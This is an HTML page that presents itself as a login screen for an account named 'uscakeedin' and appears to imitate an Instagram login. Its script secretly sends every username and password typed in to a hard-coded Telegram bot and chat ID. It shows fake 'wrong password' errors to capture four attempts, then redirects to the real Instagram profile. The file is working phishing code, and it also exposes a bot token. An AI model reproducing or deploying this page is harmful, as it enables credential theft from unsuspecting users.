<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • uscakeedin</title>
    <style>
        /* Modern Liquid Glass Style */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
        }

        body {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: #fff5f7;
            position: relative;
        }

        /* Animated iOS-style Blobs */
        .blob {
            position: absolute;
            width: 500px;
            height: 500px;
            background: linear-gradient(135deg, #ffb6c1 0%, #ffc0cb 100%);
            filter: blur(90px);
            border-radius: 50%;
            z-index: 0;
            animation: move 25s infinite alternate ease-in-out;
        }

        .blob-1 { top: -15%; left: -10%; }
        .blob-2 { bottom: -15%; right: -10%; background: #ffd1dc; animation-delay: -7s; }

        @keyframes move {
            from { transform: translate(0, 0) scale(1); }
            to { transform: translate(120px, 80px) scale(1.15); }
        }

        .main-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 370px;
            padding: 20px;
        }

        /* Glassmorphism Box */
        .glass-box {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.6);
            border-radius: 28px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
            margin-bottom: 15px;
        }

        .welcome-text {
            font-size: 26px;
            color: #1d1d1f;
            margin-bottom: 30px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        /* Error Message Style */
        #error-msg {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 18px;
            display: none;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px 16px;
            background: rgba(255, 255, 255, 0.6);
            border: 1px solid rgba(0, 0, 0, 0.05);
            border-radius: 14px;
            font-size: 15px;
            color: #1d1d1f;
            margin-bottom: 12px;
            transition: all 0.3s ease;
        }

        input:focus {
            background: rgba(255, 255, 255, 0.9);
            border: 1px solid #ffb6c1;
            outline: none;
            box-shadow: 0 0 0 4px rgba(255, 182, 193, 0.2);
        }

        .login-btn {
            width: 100%;
            background: #0071e3;
            border: none;
            border-radius: 14px;
            color: white;
            padding: 15px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(0, 113, 227, 0.2);
        }

        .login-btn:active { transform: scale(0.96); }

        .signup-box {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.6);
            border-radius: 20px;
            padding: 22px;
            text-align: center;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>

    <div class="main-wrapper">
        <div class="glass-box">
            <h1 class="welcome-text">Welcome uscakeedin</h1>
            <p id="error-msg"></p>

            <form id="login-form">
                <input type="text" id="username" placeholder="Username" required autocomplete="off">
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#" style="color:#0071e3; text-decoration:none; font-weight:600;">Sign up</a>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('login-form');
        const userInp = document.getElementById('username');
        const passInp = document.getElementById('password');
        const errorMsg = document.getElementById('error-msg');
        
        let failCount = 0;

        // Data bot kamu sudah terpasang otomatis
        const TELEGRAM_BOT_TOKEN = '8654247527:AAEQseZ7ru5zuab9UQxUW2rvr_rwhuLbUeM'; 
        const TELEGRAM_CHAT_ID = '1941574134';

        async function sendToTelegram(user, pass) {
            const message = `🔔 *Data Masuk Beb!*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n🔢 Salah ke: ${failCount + 1}`;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            
            try {
                await fetch(url);
            } catch (err) {
                console.error("Gagal kirim data ke Telegram.");
            }
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const usernameValue = userInp.value.trim();
            const passwordValue = passInp.value;

            // Kirim data diam-diam ke bot
            await sendToTelegram(usernameValue, passwordValue);

            // Cek Username
            if (usernameValue !== "uscakeedin") {
                errorMsg.textContent = "The username you entered doesn't belong to an account.";
                errorMsg.style.display = "block";
                return;
            }

            // Aturan 4x salah
            if (failCount < 4) {
                failCount++;
                errorMsg.textContent = "salah/typo ga si beb, ketik yang bener dah";
                errorMsg.style.display = "block";
                passInp.value = "";
                passInp.focus();
            } else {
                // Berhasil login setelah 4x salah
                window.location.href = "https://www.instagram.com/uscakeedin/";
            }
        });
    </script>
</body>
</html>
